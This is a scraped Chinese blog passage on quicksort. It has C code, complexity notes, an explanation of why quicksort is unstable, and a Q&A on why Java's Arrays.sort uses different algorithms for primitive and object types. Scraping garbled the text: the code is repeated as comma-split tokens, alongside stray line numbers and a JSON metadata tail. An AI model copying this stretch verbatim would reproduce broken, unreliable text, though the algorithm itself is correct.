该操作很有可能把后面元素的稳定性打乱，所以快速排序是不稳定的排序算法\r\n    return tail + 1;                    // 返回基准的索引\r\n}\r\n\r\nvoid QuickSort(int A[], int left, int right)\r\n{\r\n    if (left >= right)\r\n        return;\r\n    int pivot_index = Partition(A, left, right); // 基准的索引\r\n    QuickSort(A, left, pivot_index - 1);\r\n    QuickSort(A, pivot_index + 1, right);\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 }; // 从小到大快速排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    QuickSort(A, 0, n - 1);\r\n    printf(\"快速排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 ------------ 内部比较排序,// 数据结构 --------- 数组,// 最差时间复杂度 ---- 每次选取的基准都是最大（或最小）的元素，导致每次只划分出了一个分区，需要进行n-1次划分才能结束递归，时间复杂度为O(n^2),// 最优时间复杂度 ---- 每次选取的基准都是中位数，这样每次都均匀的划分出两个分区，只需要logn次划分就能结束递归，时间复杂度为O(nlogn),// 平均时间复杂度 ---- O(nlogn),// 所需辅助空间 ------ 主要是递归造成的栈空间的使用(用来保存left和right等局部变量)，取决于递归树的深度，一般为O(logn)，最差为O(n)       ,// 稳定性 ---------- 不稳定, ,void, ,Swap,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,j,),{,    ,int, ,temp, ,=, ,A,[,i,],;,    ,A,[,i,], ,=, ,A,[,j,],;,    ,A,[,j,], ,=, ,temp,;,}, ,int, ,Partition,(,int, ,A,[,],,, ,int, ,left,,, ,int, ,right,),  ,// 划分函数,{,    ,int, ,pivot, ,=, ,A,[,right,],;,               ,// 这里每次都选择最后一个元素作为基准,    ,int, ,tail, ,=, ,left, ,-, ,1,;,                ,// tail为小于基准的子数组最后一个元素的索引,    ,for, ,(,int, ,i, ,=, ,left,;, ,i, ,<, ,right,;, ,i,++,),  ,// 遍历基准以外的其他元素,    ,{,        ,if, ,(,A,[,i,], ,<=, ,pivot,),              ,// 把小于等于基准的元素放到前一个子数组末尾,        ,{,            ,Swap,(,A,,, ,++,tail,,, ,i,),;,        ,},    ,},    ,Swap,(,A,,, ,tail, ,+, ,1,,, ,right,),;,           ,// 最后把基准放到前一个子数组的后边，剩下的子数组既是大于基准的子数组,                                        ,// 该操作很有可能把后面元素的稳定性打乱，所以快速排序是不稳定的排序算法,    ,return, ,tail, ,+, ,1,;,                    ,// 返回基准的索引,}, ,void, ,QuickSort,(,int, ,A,[,],,, ,int, ,left,,, ,int, ,right,),{,    ,if, ,(,left, ,>=, ,right,),        ,return,;,    ,int, ,pivot_index, ,=, ,Partition,(,A,,, ,left,,, ,right,),;, ,// 基准的索引,    ,QuickSort,(,A,,, ,left,,, ,pivot_index, ,-, ,1,),;,    ,QuickSort,(,A,,, ,pivot_index, ,+, ,1,,, ,right,),;,}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,5,,, ,2,,, ,9,,, ,4,,, ,7,,, ,6,,, ,1,,, ,3,,, ,8, ,},;, ,// 从小到大快速排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,QuickSort,(,A,,, ,0,,, ,n, ,-, ,1,),;,    ,printf,(,\"快速排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用快速排序法对一列数字进行排序的过程：,\n,\n,快速排序是不稳定的排序算法，不稳定发生在基准元素与A[tail+1]交换的时刻。,\n,比如序列：{ 1, 3, 4, 2, 8, 9, 8, 7, 5 }，基准元素是5，一次划分操作后5要和第一个8进行交换，从而改变了两个元素8的相对次序。,\n,Java系统提供的Arrays.sort函数。对于基础类型，底层使用快速排序。对于非基础类型，底层使用归并排序。请问是为什么？,\n,答：这是考虑到排序算法的稳定性。对于基础类型，相同值是无差别的，排序前后相同值的相对位置并不重要，所以选择更为高效的快速排序，尽管它是不稳定的排序算法；而对于非基础类型，排序前后相等实例的相对位置不宜改变，所以选择稳定的归并排序。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 19 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113863/", "url_object_id": "10ced989709fd8ca75a2272ea7f16567", "front_image_path": "full/30fcdf79d0b901a9dde107f5e6e10f11fd95d574.jpg"}